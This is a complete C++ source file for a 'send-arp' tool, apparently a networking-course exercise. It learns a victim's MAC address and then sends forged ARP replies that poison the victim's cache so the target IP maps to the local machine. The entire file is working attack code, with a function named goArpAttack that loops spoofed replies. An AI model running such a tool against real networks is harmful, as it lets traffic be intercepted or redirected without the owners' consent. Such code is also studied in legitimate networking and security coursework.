#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <map>
#include <cstdlib>
#include <string>
#include <cstdbool>
#include <ifaddrs.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <cstring>
#include <vector>

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

char* device;
Mac   localMac;
Ip    localIp;

void getLocal() {
    struct ifaddrs *ifaddr, *ifa;
    char ip[100];

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        return;
    }

    for (ifa = ifaddr; ifa != nullptr; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == nullptr) {
            continue;
        }

        if (ifa->ifa_addr->sa_family == AF_INET) { // AF_INET for IPv4
            void *addr = &((struct sockaddr_in *)ifa->ifa_addr)->sin_addr;

            // Convert the IP to a string
            if (inet_ntop(AF_INET, addr, ip, 32) == nullptr) {
                perror("inet_ntop");
                return;
            }
            if(!strcmp(ifa->ifa_name, device)){
                localIp = Ip(ip);
                freeifaddrs(ifaddr);
                return;
            }
        }
    }

    freeifaddrs(ifaddr);
    printf("[error] error in geting ip");
}


void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void sendArp(Mac smac, Mac dmac, Ip sip, Ip tip, uint16_t mode){ // mode: ArpHdr::Reply, ArpHdr::Request
    EthArpPacket packet;
    char         errbuf[PCAP_ERRBUF_SIZE];
    pcap_t*      handle = pcap_open_live(device, 0, 0, 0, errbuf);

    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", device, errbuf);
        exit(-1);
    }

    packet.eth_.dmac_ = dmac;
    packet.eth_.smac_ = smac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    if(dmac == Mac("ff:ff:ff:ff:ff:ff")){
        dmac = Mac("00:00:00:00:00:00");
    }

    packet.arp_.hrd_  = htons(ArpHdr::ETHER);
    packet.arp_.pro_  = htons(EthHdr::Ip4);
    packet.arp_.hln_  = Mac::SIZE;
    packet.arp_.pln_  = Ip::SIZE;
    packet.arp_.op_   = htons(mode);
    packet.arp_.smac_ = smac;
    packet.arp_.sip_  = htonl(sip);
    packet.arp_.tmac_ = dmac;
    packet.arp_.tip_  = htonl(tip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    pcap_close(handle);
}

void getLocalMac(){
    // https://stackoverflow.com/questions/1779715/how-to-get-mac-address-of-your-machine-using-a-c-program
    string target = string("/sys/class/net/") + string(device) + string("/address");
    char   lmac[] = "00:00:00:00:00:00";

    FILE *fp = fopen(target.c_str(), "r");
    if(fp == nullptr){
        char errbuf[PCAP_ERRBUF_SIZE];
        fprintf(stderr, "couldn't open device %s(%s)\n", device, errbuf);
        exit(-1);
    }

    fscanf(fp, "%s", lmac);
    localMac = Mac(lmac);

    printf("local mac address: %s\n", lmac);
    fclose(fp);
}

map<Ip, int> dataMap;
int          cnts = 0;
vector<Mac>  macs = {};

void getMacFromArp(Ip tip, Ip usingip){
    if(dataMap.find(tip) != dataMap.end()) return;

    const u_char* data;
    pcap_pkthdr*  temp;
    char          errbuf[PCAP_ERRBUF_SIZE];

    sendArp(localMac, Mac("ff:ff:ff:ff:ff:ff"), usingip, tip, ArpHdr::Request);

    pcap_t* handle = pcap_open_live(device, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", device, errbuf);
        exit(-1);
    }

    while(1){
        int res = pcap_next_ex(handle, &temp, &data);
        if(res==0) continue;
        if(res==-1 || res==-2){
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        EthArpPacket* packetPtr = (EthArpPacket*)data;

        if(packetPtr->eth_.type_ != htons(EthHdr::Arp)) continue;
        if(packetPtr->arp_.sip_  != htonl(tip))         continue;

        macs.push_back(packetPtr->arp_.smac());

        dataMap.insert( { Ip(ntohl(packetPtr->arp_.sip_)), cnts++ } );
        break;
    }
    pcap_close(handle);
}

void goArpAttack(Ip sip, Ip tip){
    getMacFromArp(sip, localIp);

    Mac smac = macs[dataMap[sip]];

    for(int i=0;i<5;i++) sendArp(localMac, smac, tip, sip, ArpHdr::Reply);
}

int main(int argc, char* argv[]) {
    if (argc <= 3 || argc % 2 == 1) {
        usage();
        return -1;
    }
    device = argv[1];

    getLocalMac();
    getLocal();

    for(int i=2; i<argc; i+=2){
        printf("processing %s to %s\n", argv[i], argv[i+1]);
        goArpAttack(Ip(argv[i]), Ip(argv[i+1]));
        printf("success!\n");
    }
    
    return 0;
}
